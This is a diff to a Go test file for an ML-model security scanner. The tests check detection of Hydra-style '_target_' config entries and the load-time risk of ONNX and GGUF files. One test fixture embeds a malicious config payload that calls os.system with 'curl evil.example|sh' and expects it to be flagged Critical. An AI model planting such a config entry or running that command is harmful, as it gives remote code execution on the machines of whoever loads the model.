@@ -1,6 +1,7 @@
 package inspector
 
 import (
+	securityv1alpha1 "github.com/DAVANO-INNOVATION-LAB/assay/api/v1alpha1"
 	"os"
 	"path/filepath"
 	"testing"
@@ -120,9 +121,19 @@ func TestExecutesOnLoadClassification(t *testing.T) {
 			t.Errorf("%s executes code on load and must be classified as such", f)
 		}
 	}
-	// safetensors exists precisely because it cannot execute on load. Treating
-	// it as executable would produce noise on the format we want people using.
-	for _, f := range []string{"a.safetensors", "a.json", "a.txt", "a.md", "a.onnx", "a.gguf"} {
+	// ONNX resolves custom operator domains to native libraries, and a GGUF
+	// chat template is rendered by a Jinja engine (CVE-2024-34359). Neither is
+	// pickle-style deserialization, but an unreadable one is not a footnote.
+	for _, f := range []string{"a.onnx", "a.gguf"} {
+		if !executesOnLoad(f) {
+			t.Errorf("%s has a documented load-time code path and must not be treated "+
+				"as inert when it cannot be parsed", f)
+		}
+	}
+
+	// safetensors exists precisely because it has no such path. Treating it as
+	// executable would produce noise on the format we want people using.
+	for _, f := range []string{"a.safetensors", "a.json", "a.txt", "a.md"} {
 		if executesOnLoad(f) {
 			t.Errorf("%s does not execute code on load", f)
 		}
@@ -140,4 +151,89 @@ func indexOf(h, n string) int {
 		}
 	}
 	return -1
+}
+
+// A model can ship weights that genuinely cannot execute anything and still
+// achieve code execution through its config, because a Hydra-style loader
+// imports whatever _target_ names and calls it before any weight is read.
+// CVE-2025-23304 (NVIDIA NeMo) and CVE-2026-22584 (Salesforce Uni2TS, which
+// ships safetensors) are this class.
+func TestHydraTargetInConfigIsDetected(t *testing.T) {
+	dir := t.TempDir()
+	cfg := `{
+	  "architectures": ["LlamaForCausalLM"],
+	  "model_type": "llama",
+	  "preprocessor": {"_target_": "os.system", "args": ["curl evil.example|sh"]}
+	}`
+	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte(cfg), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	// Weights that cannot execute anything, to prove the config is the payload.
+	if err := os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("x"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	report, err := Inspect(dir, DefaultLimits())
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	var found *securityv1alpha1.Finding
+	for i := range report.Findings {
+		if report.Findings[i].ID == "ASSAY-CONFIG-001" {
+			found = &report.Findings[i]
+		}
+	}
+	if found == nil {
+		t.Fatalf("a _target_ naming os.system must be detected; got %v", findingIDs(report))
+	}
+	if found.Severity != "Critical" {
+		t.Errorf("os.system as an instantiation target is Critical, got %s", found.Severity)
+	}
+	// The location has to name where in the config it was, or a reviewer has
+	// to grep a nested document by hand.
+	if !contains(found.Location, "preprocessor") {
+		t.Errorf("the finding should locate the key, got %q", found.Location)
+	}
+}
+
+// A target pointing at the model's own framework is how these loaders are
+// meant to work. Rating it Critical would fire on a large share of legitimate
+// configs, and a scanner that alarms on the ordinary case gets switched off.
+func TestOrdinaryTargetIsNotCritical(t *testing.T) {
+	dir := t.TempDir()
+	cfg := `{"scheduler": {"_target_": "diffusers.schedulers.DDIMScheduler"}}`
+	os.WriteFile(filepath.Join(dir, "config.json"), []byte(cfg), 0o644)
+	os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("x"), 0o644)
+
+	report, err := Inspect(dir, DefaultLimits())
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, f := range report.Findings {
+		if f.ID == "ASSAY-CONFIG-001" {
+			if f.Severity == "Critical" {
+				t.Fatal("a framework class is the normal case and must not be Critical")
+			}
+			return
+		}
+	}
+	t.Fatal("it should still be reported — it does execute on load")
+}
+
+func TestConfigWithoutTargetsIsClean(t *testing.T) {
+	dir := t.TempDir()
+	os.WriteFile(filepath.Join(dir, "config.json"),
+		[]byte(`{"architectures":["BertModel"],"hidden_size":768}`), 0o644)
+	os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("x"), 0o644)
+
+	report, err := Inspect(dir, DefaultLimits())
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, f := range report.Findings {
+		if f.ID == "ASSAY-CONFIG-001" {
+			t.Fatalf("an ordinary config must not be flagged: %+v", f)
+		}
+	}
 }
